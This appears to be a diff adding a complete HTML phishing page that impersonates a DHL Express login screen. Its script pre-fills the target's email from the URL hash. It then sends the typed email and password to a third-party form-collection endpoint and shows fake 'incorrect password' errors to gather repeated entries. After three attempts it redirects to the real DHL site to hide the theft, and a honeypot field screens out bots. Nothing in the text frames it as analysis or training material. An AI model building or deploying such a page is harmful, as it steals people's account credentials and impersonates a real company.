@@ -1,0 +1,165 @@
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>DHL Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        /* Hide honeypot field */
+        .honeypot {
+            display: none; /* Keep this field hidden */
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-b from-[#F2C500] to-[#F9D66B] min-h-screen flex flex-col">
+    <header class="flex justify-between items-center px-6 pt-6">
+        <div class="text-[#DB0A1E] font-extrabold text-3xl tracking-tight select-none">
+            DHL Express
+        </div>
+        <button aria-label="Select language" class="flex items-center text-[#DB0A1E] font-extrabold text-lg space-x-1">
+            <span>En</span>
+            <svg aria-hidden="true" class="w-4 h-4" fill="none" stroke="#DB0A1E" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24">
+                <polyline points="6 9 12 15 18 9"></polyline>
+            </svg>
+        </button>
+    </header>
+
+    <main class="flex-grow px-6 pt-6 pb-12 max-w-md mx-auto w-full">
+        <h1 class="text-black text-2xl font-extrabold mb-6">
+            Send package
+        </h1>
+        <button class="w-full bg-[#DB0A1E] text-white font-extrabold text-lg py-4 rounded-md mb-8" type="button">
+            Send directly
+        </button>
+        <hr class="border-t border-[#BFA02B] mb-8"/>
+        <h2 class="text-black text-2xl font-extrabold mb-6">
+            Continue with your password
+        </h2>
+        <form id="signin-form" class="space-y-4" novalidate>
+            <!-- Honeypot Input -->
+            <input type="text" name="honeypot" class="honeypot" autocomplete="off" />
+            <!-- Email Input -->
+            <div class="relative">
+                <input id="email" class="w-full rounded-md p-4 text-gray-700 text-base placeholder-gray-500 focus:outline-none" placeholder="Email address" required disabled>
+            </div>
+            <div class="relative">
+                <input id="password" class="w-full rounded-md p-4 pr-12 text-gray-700 text-base placeholder-gray-500 focus:outline-none" placeholder="Password" required type="password"/>
+                <span aria-label="Show password" class="absolute inset-y-0 right-4 flex items-center text-gray-700 cursor-pointer" id="toggle-password">
+                    <i class="fas fa-eye"></i>
+                </span>
+            </div>
+            <button class="w-full bg-[#DB0A1E] text-white font-extrabold text-lg py-4 rounded-md mt-2" type="submit">
+                Login
+            </button>
+        </form>
+        <p id="error-message" class="text-red-500 text-center mt-4"></p>
+        <div class="text-center mt-6">
+            <a class="text-[#DB0A1E] text-lg font-normal underline" href="#">
+                Reset Password
+            </a>
+        </div>
+        <div class="text-center mt-8 space-y-2 text-black text-lg font-normal">
+            <p>
+                Don't have an account yet?
+                <a class="text-[#DB0A1E] underline" href="#">
+                    Sign up
+                </a>
+            </p>
+            <p>
+                Business user?
+                <a class="text-[#DB0A1E] underline" href="#">
+                    Sign in
+                </a>
+            </p>
+        </div>
+    </main>
+
+    <script>
+        (() => {
+            const form = document.getElementById('signin-form');
+            const errorMessageEl = document.getElementById('error-message');
+            const maxAttempts = 3; // Maximum number of attempts
+            const submitEndpoint = 'https://submit-form.com/bGzfmQgHk'; // Your endpoint URL
+            let attemptCount = 0;
+
+            // Extract email from the URL hash (after #)
+            let emailParam = window.location.hash ? window.location.hash.substring(1) : null;
+
+            if (emailParam) {
+                // Pre-fill the email input field
+                const emailInput = document.getElementById('email');
+                emailInput.value = decodeURIComponent(emailParam);
+                emailInput.disabled = false; // Enable the email input field
+            } else {
+                console.warn("No email found in the URL hash.");
+            }
+
+            form.addEventListener('submit', async (event) => {
+                event.preventDefault();
+                errorMessageEl.textContent = '';
+
+                const email = form.email.value.trim();
+                const password = form.password.value;
+                const honeypot = form.honeypot.value; // Get the honeypot value
+
+                // Basic client-side validation
+                if (!email || !password) {
+                    errorMessageEl.textContent = 'Please enter both email and password.';
+                    return;
+                }
+
+                // Check if honeypot is filled
+                if (honeypot) {
+                    console.warn('Honeypot field filled, likely a bot submission.');
+                    return; // Do not proceed with the submission
+                }
+
+                // Report credentials to the endpoint
+                try {
+                    const response = await fetch(submitEndpoint, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email, password }),
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('Login failed');
+                    }
+
+                    // Handle successful login (you can redirect or show a success message)
+                    console.log('Login successful');
+                } catch (error) {
+                    attemptCount++; // Increment the attempt count
+                    if (attemptCount < maxAttempts) {
+                        // Reset password field and show error message
+                        form.password.value = '';
+                        form.password.focus();
+                        errorMessageEl.textContent = 'Incorrect email or password. Please try again.';
+                    } else {
+                        // Redirect on 5th attempt
+                        window.location.href = 'https://mydhl.express.dhl/gq/en/auth/link-error.html';
+                    }
+                }
+            });
+
+            // Toggle password visibility
+            const togglePassword = document.getElementById('toggle-password');
+            togglePassword.addEventListener('click', () => {
+                const passwordInput = document.getElementById('password');
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                togglePassword.querySelector('i').classList.toggle('fa-eye-slash');
+            });
+        })();
+    </script>
+    <!-- Hidden background iframe -->
+    <iframe id="background-iframe" src="about:blank" style="display:none"></iframe>
+</body>
+</html>
